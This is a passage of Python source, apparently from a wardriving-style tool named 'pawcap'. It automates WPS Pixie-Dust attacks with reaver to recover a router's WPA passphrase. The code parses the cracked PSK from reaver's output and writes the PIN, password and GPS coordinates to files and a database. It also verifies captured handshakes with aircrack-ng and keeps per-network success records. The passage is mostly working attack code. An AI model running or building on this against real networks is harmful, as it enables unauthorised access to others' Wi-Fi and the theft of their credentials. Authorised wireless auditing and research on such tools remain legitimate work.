                if not psk:
                    self._log_activity('INFO', f"WPS PIN found ({pin}), recovering PSK for {ssid}")
                    try:
                        psk_cmd = [
                            'sudo', 'reaver',
                            '-i', interface,
                            '-b', bssid,
                            '-c', str(channel),
                            '-p', pin,
                            '-vv'
                        ]
                        psk_result = subprocess.run(psk_cmd, capture_output=True, text=True, timeout=30)
                        psk_output = psk_result.stdout + '\n' + psk_result.stderr
                        psk_match = re.search(r"\[\+\]\s+WPA PSK:\s+'(.+?)'", psk_output)
                        if psk_match:
                            psk = psk_match.group(1)
                    except subprocess.TimeoutExpired:
                        subprocess.run(['sudo', 'pkill', '-f', f'reaver.*{bssid}'],
                                      capture_output=True, timeout=3)
                
                if bssid in self.wps_networks:
                    self.wps_networks[bssid]['attempted'] = True
                    self.wps_networks[bssid]['vulnerable'] = True
                return pin, psk
            
            # No PIN found — likely not vulnerable
            if bssid in self.wps_networks:
                self.wps_networks[bssid]['attempted'] = True
                self.wps_networks[bssid]['vulnerable'] = False
            return None, None
        
        except subprocess.TimeoutExpired:
            self._log_activity('INFO', f"Pixie-Dust timed out on {ssid}")
            subprocess.run(['sudo', 'pkill', '-f', f'reaver.*{bssid}'],
                          capture_output=True, timeout=3)
            if bssid in self.wps_networks:
                self.wps_networks[bssid]['attempted'] = True
            return None, None
        except Exception as e:
            self._log_activity('WARN', f"WPS Pixie-Dust failed: {e}")
            if bssid in self.wps_networks:
                self.wps_networks[bssid]['attempted'] = True
            return None, None
        finally:
            subprocess.run(['sudo', 'pkill', '-f', f'reaver.*{interface}'],
                          capture_output=True, timeout=3)

    def _save_wps_success(self, bssid, ssid, channel, pin, psk):
        """Save a successful WPS Pixie-Dust result."""
        self._log_activity('SUCCESS', f"WPS Pixie-Dust cracked {ssid} — PIN: {pin}" +
                          (f", PSK: {psk}" if psk else ""))
        
        # Create a result file
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        safe_ssid = "".join(c for c in ssid if c.isalnum() or c in ('-', '_'))
        safe_bssid = bssid.replace(':', '')
        tmp_file = f"/tmp/pawcap_wps_{safe_bssid}_{timestamp}.txt"
        
        with open(tmp_file, 'w') as f:
            f.write(f"BSSID: {bssid}\n")
            f.write(f"SSID: {ssid}\n")
            f.write(f"Channel: {channel}\n")
            f.write(f"WPS PIN: {pin}\n")
            if psk:
                f.write(f"WPA PSK: {psk}\n")
            f.write(f"Captured: {datetime.now().isoformat()}\n")
        
        gps_data = self.gps.get_current() if self.gps else None
        
        # Save to DB as a handshake (reuses existing schema)
        if self.db:
            self.db.add_handshake(bssid, ssid, tmp_file, gps_data, channel=channel)
            # Mark as cracked with the password
            if psk:
                self.db.update_password(bssid, psk)
        
        # Copy to permanent storage
        dest_dir = self.config['capture']['handshake_dir']
        os.makedirs(dest_dir, exist_ok=True)
        dest_file = os.path.join(dest_dir, f"WPS_{safe_ssid}_{safe_bssid}_{timestamp}.txt")
        shutil.copy2(tmp_file, dest_file)
        os.remove(tmp_file)
        
        # Update stats
        self.stats['handshakes'] += 1
        self.stats['wps_captures'] = self.stats.get('wps_captures', 0) + 1
        self.capture_successes += 1
        self.last_handshake_time = time.time()
        self._pack_notify_handshake(bssid, ssid, dest_file, channel)
        
        # Record success in knowledge
        if self.db and hasattr(self.db, 'record_success'):
            self.db.record_success(bssid)
        if bssid in self.network_knowledge:
            self.network_knowledge[bssid]['consecutive_failures'] = 0
            self.network_knowledge[bssid]['total_successes'] = \
                self.network_knowledge[bssid].get('total_successes', 0) + 1
            self.network_knowledge[bssid]['last_success_time'] = time.time()

    def _check_handshake(self, pcap_file, bssid):
        """Verify handshake exists in capture file using aircrack-ng"""
        try:
            # aircrack-ng will report if a handshake is present
            cmd = ['aircrack-ng', pcap_file]
            result = subprocess.run(cmd, capture_output=True, timeout=10, text=True,
                                  stdin=subprocess.DEVNULL)
            
            output = result.stdout.lower()
            
            # aircrack-ng output includes "1 handshake" when found
            if '1 handshake' in output and bssid.lower() in output:
                return True
            
            return False
            
        except:
            return False
    
    def _cleanup_temp_files(self):
        """Clean up any leftover temp files"""
        for pattern in ['/tmp/pawcap_scan*', '/tmp/pawcap_capture*']:
            for f in globmod.glob(pattern):
                try:
                    os.remove(f)
                except:
                    pass
    
    def _stop_capture(self, bssid):
        """Stop capturing a specific network"""
        with self.capture_lock:
            self.capturing.pop(bssid, None)
